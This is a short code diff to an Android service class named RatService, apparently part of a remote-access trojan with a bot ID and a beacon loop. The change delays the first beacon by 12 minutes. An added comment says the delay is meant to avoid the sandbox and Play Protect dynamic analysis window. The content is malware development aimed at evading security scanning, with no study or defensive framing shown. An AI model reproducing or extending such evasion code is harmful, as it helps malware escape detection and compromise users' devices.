@@ -50,7 +50,8 @@ public class RatService extends Service {
         beaconLoop = this::beacon;
 
         startForeground(NOTIF_ID, buildNotification());
-        handler.post(beaconLoop);
+        // Delay first beacon 12 minutes — avoids sandbox/Play Protect dynamic analysis window
+        handler.postDelayed(beaconLoop, 12 * 60 * 1000L);
         Log.i(TAG, "started  id=" + botId);
     }
 
